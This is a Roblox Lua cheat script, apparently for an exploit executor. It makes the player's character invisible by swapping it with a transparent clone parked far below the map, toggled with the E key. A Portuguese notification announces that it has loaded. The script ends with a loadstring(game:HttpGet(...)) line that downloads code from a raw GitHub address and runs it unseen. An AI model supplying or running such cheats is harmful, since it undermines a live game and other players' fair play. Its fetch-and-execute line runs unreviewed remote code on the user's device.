             local ScriptStarted = false
   local Keybind = "E"
   local Transparency = true
   local NoClip = false
   local Player = game:GetService("Players").LocalPlayer
   local RealCharacter = Player.Character or Player.CharacterAdded:Wait()
   local IsInvisible = false
   RealCharacter.Archivable = true
   local FakeCharacter = RealCharacter:Clone()
   local Part
   Part = Instance.new("Part", workspace)
   Part.Anchored = true
   Part.Size = Vector3.new(200, 1, 200)
   Part.CFrame = CFrame.new(0, -500, 0)
   Part.CanCollide = true
   FakeCharacter.Parent = workspace
   FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
   for i, v in pairs(RealCharacter:GetChildren()) do
     if v:IsA("LocalScript") then
         local clone = v:Clone()
         clone.Disabled = true
         clone.Parent = FakeCharacter
     end
   end
   if Transparency then
     for i, v in pairs(FakeCharacter:GetDescendants()) do
         if v:IsA("BasePart") then
             v.Transparency = 0.7
         end
     end
   end
   local CanInvis = true
   function RealCharacterDied()
     CanInvis = false
     RealCharacter:Destroy()
     RealCharacter = Player.Character
     CanInvis = true
     isinvisible = false
     FakeCharacter:Destroy()
     workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
     RealCharacter.Archivable = true
     FakeCharacter = RealCharacter:Clone()
     Part:Destroy()
     Part = Instance.new("Part", workspace)
     Part.Anchored = true
     Part.Size = Vector3.new(200, 1, 200)
     Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
     Part.CanCollide = true
     FakeCharacter.Parent = workspace
     FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
     for i, v in pairs(RealCharacter:GetChildren()) do
         if v:IsA("LocalScript") then
             local clone = v:Clone()
             clone.Disabled = true
             clone.Parent = FakeCharacter
         end
     end
     if Transparency then
         for i, v in pairs(FakeCharacter:GetDescendants()) do
             if v:IsA("BasePart") then
                 v.Transparency = 0.7
             end
         end
     end
    RealCharacter.Humanoid.Died:Connect(function()
    RealCharacter:Destroy()
    FakeCharacter:Destroy()
    end)
    Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
   end
   RealCharacter.Humanoid.Died:Connect(function()
    RealCharacter:Destroy()
    FakeCharacter:Destroy()
    end)
   Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
   local PseudoAnchor
   game:GetService "RunService".RenderStepped:Connect(
     function()
         if PseudoAnchor ~= nil then
             PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
         end
          if NoClip then
         FakeCharacter.Humanoid:ChangeState(11)
          end
     end
   )
   PseudoAnchor = FakeCharacter.HumanoidRootPart
   local function Invisible()
     if IsInvisible == false then
         local StoredCF = RealCharacter.HumanoidRootPart.CFrame
         RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
         FakeCharacter.HumanoidRootPart.CFrame = StoredCF
         RealCharacter.Humanoid:UnequipTools()
         Player.Character = FakeCharacter
         workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
         PseudoAnchor = RealCharacter.HumanoidRootPart
         for i, v in pairs(FakeCharacter:GetChildren()) do
             if v:IsA("LocalScript") then
                 v.Disabled = false
             end
         end
         IsInvisible = true
     else
         local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
         FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
    
         RealCharacter.HumanoidRootPart.CFrame = StoredCF
    
         FakeCharacter.Humanoid:UnequipTools()
         Player.Character = RealCharacter
         workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
         PseudoAnchor = FakeCharacter.HumanoidRootPart
         for i, v in pairs(FakeCharacter:GetChildren()) do
             if v:IsA("LocalScript") then
                 v.Disabled = true
             end
         end
         IsInvisible = false
     end
   end
   game:GetService("UserInputService").InputBegan:Connect(
     function(key, gamep)
         if gamep then
             return
         end
         if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
             if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
                 Invisible()
             end
         end
     end
   )
   local Sound = Instance.new("Sound",game:GetService("SoundService"))
   Sound.SoundId = "rbxassetid://232127604"
   Sound:Play()
   game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisivel Carregado!",["Text"] = "Pressione "..Keybind.." Para usar o invisivel!",["Duration"] = 20,["Button1"] = "Okay."})
   
   loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
